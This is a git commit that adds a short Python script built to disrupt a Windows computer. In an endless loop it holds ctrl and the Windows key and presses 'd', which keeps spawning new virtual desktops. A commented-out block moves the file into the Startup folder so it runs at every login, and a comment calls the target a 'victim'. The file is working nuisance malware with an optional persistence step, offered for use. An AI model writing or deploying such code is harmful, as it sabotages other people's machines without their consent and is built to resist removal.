f0d9c087021eafce14c4c1d758466876664ecd70
Professor Kablammo <bumbum4321234@gmail.com>
2021-05-23 20:25:48 +1000

    Create Code.py

---
+++ Code.py
@@ -0,0 +1,11 @@
+import keyboard
+import time
+'''(optional move to startup):
+import shutil
+import os
+shutil.move(__file__,os.environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")'''
+keyboard.press("ctrl")
+keyboard.press("cmd")
+while True:
+  keyboard.send("d")
+  time.sleep(0.1) #So victim can see that their computer is f**ked up.
